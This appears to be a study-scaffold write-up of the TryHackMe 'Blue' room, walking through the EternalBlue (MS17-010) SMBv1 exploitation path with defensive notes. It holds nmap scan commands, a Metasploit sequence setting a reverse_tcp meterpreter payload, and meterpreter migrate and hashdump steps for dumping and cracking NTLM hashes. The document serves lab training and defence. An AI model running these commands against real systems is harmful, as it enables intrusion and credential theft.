# Blue — TryHackMe

> **Preparation stub.** Based on publicly documented information about this well-known retired
> room — not an original solve, and no live flag values are recorded. Use this as a study scaffold;
> complete the bracketed fields when working the room under your own account. Only document legally
> authorised activity.

## Engagement metadata

| Field | Value |
|-------|-------|
| Platform | TryHackMe |
| Room | Blue |
| Difficulty | Easy |
| Category | Windows |
| Target IP | 10.x.x.x (lab-assigned) |
| Date completed | [YYYY-MM-DD] |

## Executive summary

A Windows host exposed to the **EternalBlue** SMBv1 vulnerability (**MS17-010**). Exploitation
yields a SYSTEM-level shell directly, after which credentials are dumped and the flags collected.
The room teaches the canonical "unpatched SMB → full compromise" path that underpinned WannaCry.

## Scenario value (study scaffold)

- **What it tests:** identifying a critical unauthenticated RCE from a service banner + vuln scan, and
  the "single unpatched legacy service → full compromise" lesson.
- **What completing it demonstrates:** confident use of `nmap` vuln NSE, the EternalBlue exploit
  (Metasploit *and* the manual AutoBlue path), post-exploitation (migrate, hashdump, offline crack),
  and the blue-team transfer — why SMBv1 must be disabled and patched (MITRE T1210).

## Key vulnerability class

- **CWE/Class:** Remote code execution via memory corruption in SMBv1 (`srv.sys`).
- **Identifier:** **MS17-010** (CVEs in the 2017-0143…0148 range; EternalBlue is commonly tied to
  **CVE-2017-0144**). *Verify the exact CVE when citing.*
- **Why it matters:** the same flaw weaponised by WannaCry/NotPetya in 2017 — the textbook example
  of why legacy SMBv1 must be disabled and patches applied promptly.

## 1. Reconnaissance

```
nmap -sC -sV -p- -oA nmap/blue 10.x.x.x
nmap --script smb-vuln-ms17-010 -p445 10.x.x.x
```

Expected exposed surface (confirm on completion):

| Port | Service | Note |
|------|---------|------|
| 135/tcp | msrpc | Windows RPC endpoint mapper |
| 139/tcp | netbios-ssn | NetBIOS session |
| 445/tcp | microsoft-ds | **SMB — the vector** |
| 3389/tcp | ms-wbt-server | RDP (often present, not the path) |
| 49152+/tcp | msrpc | High dynamic RPC ports |

The `smb-vuln-ms17-010` NSE script should report the host as **VULNERABLE**. [Paste trimmed scan
output on completion.]

## 2. Enumeration

```
nmap --script "smb-os-discovery,smb-security-mode" -p445 10.x.x.x
```

- Confirm the Windows version (typically Windows 7 / Server 2008 R2 era) and that **SMBv1** is
  enabled and **message signing is not required** — both preconditions for EternalBlue.
- The single load-bearing fact is the `smb-vuln-ms17-010` = VULNERABLE result; the rest is
  confirmation. [Record OS-discovery output on completion.]

## 3. Exploitation

```
# Metasploit path
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.x.x.x
set LHOST <tun0 ip>
set payload windows/x64/meterpreter/reverse_tcp
exploit
```

- The exploit corrupts SMBv1 pool memory to gain kernel execution; the resulting shell typically
  lands **already as `NT AUTHORITY\SYSTEM`** — no privilege-escalation step is required.
- **Manual/alternative path:** the standalone `AutoBlue-MS17-010` scripts (`eternalblue_exploit*.py`
  plus a shellcode generator) achieve the same without Metasploit — worth doing once to understand
  the kernel-shellcode delivery rather than treating it as a black box.
- **User flag:** `[capture on completion]`
- **Root/SYSTEM flag:** `[capture on completion]`

## 4. Post-exploitation

```
# from meterpreter
getuid                # expect NT AUTHORITY\SYSTEM
ps                    # find a stable x64 process to migrate into
migrate <PID>         # e.g. a spoolsv.exe / lsass-adjacent process
hashdump              # dump local SAM NTLM hashes
```

- **Migrate early.** The initial EternalBlue process can be unstable; move into a stable native
  process before further work.
- Dump the SAM with `hashdump`; the room walks through cracking the recovered NTLM hash offline
  (`john`/`hashcat` against `rockyou.txt`).
- Flags are placed around the filesystem (search the typical user/root locations); collect all three.

## 5. Tools used

| Phase | Tools |
|-------|-------|
| Recon | `nmap` (`-sC -sV -p-`, `--script smb-vuln-ms17-010`) |
| Enumeration | `nmap` NSE (`smb-os-discovery`, `smb-security-mode`) |
| Exploitation | Metasploit (`ms17_010_eternalblue`) or AutoBlue-MS17-010 |
| Post-exploitation | meterpreter (`migrate`, `hashdump`), `john`/`hashcat` (offline NTLM crack) |

## 6. MITRE ATT&CK mapping

| Tactic | Technique | ID |
|--------|-----------|-----|
| Initial Access | Exploit Public-Facing Application | T1190 |
| Execution / Lateral | Exploitation of Remote Services | T1210 |
| Credential Access | OS Credential Dumping: SAM | T1003.002 |
| Defense Evasion | Process Injection / Migration | T1055 |

## 7. Key learnings

- **SMBv1/MS17-010 is a kill shot** — full SYSTEM from a single unpatched service; demonstrates why
  patch management and disabling legacy SMB are non-negotiable.
- **Process migration matters** — the initial EternalBlue process can be unstable; migrate before
  doing further work.
- **Do the manual exploit once.** Running AutoBlue rather than the Metasploit module forces you to
  understand the kernel-shellcode delivery — useful when a module is unavailable or disallowed.
- **Detection note (blue-team transfer):** MS17-010 exploitation is loud — anomalous SMBv1 traffic
  and the spawned SYSTEM process are detectable; map to MITRE **T1210**. Defensive control: disable
  SMBv1 entirely and require SMB signing.

## 8. References

- MS17-010 / EternalBlue (verify exact CVE before citing).
- Metasploit `ms17_010_eternalblue` module documentation.
- AutoBlue-MS17-010 (manual exploitation reference).
